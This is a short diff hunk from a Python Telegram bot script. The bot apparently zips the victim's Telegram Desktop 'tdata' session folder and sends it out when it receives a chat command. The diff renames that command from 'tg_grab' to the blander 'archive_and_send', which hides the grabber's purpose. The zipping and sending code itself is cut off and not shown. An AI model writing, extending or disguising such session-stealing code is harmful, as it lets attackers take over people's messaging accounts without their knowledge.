@@ -340,7 +340,7 @@ def archive_and_send():
             print(f"Error creating or sending zip file: {str(e)}")
     else:
         print("Папка 'tdata' не найдена.")
-@bot.message_handler(commands=['tg_grab'])
+@bot.message_handler(commands=['archive_and_send'])
 def handle_archive_and_send(message):
     chat_id = message.chat.id
     archive_and_send()
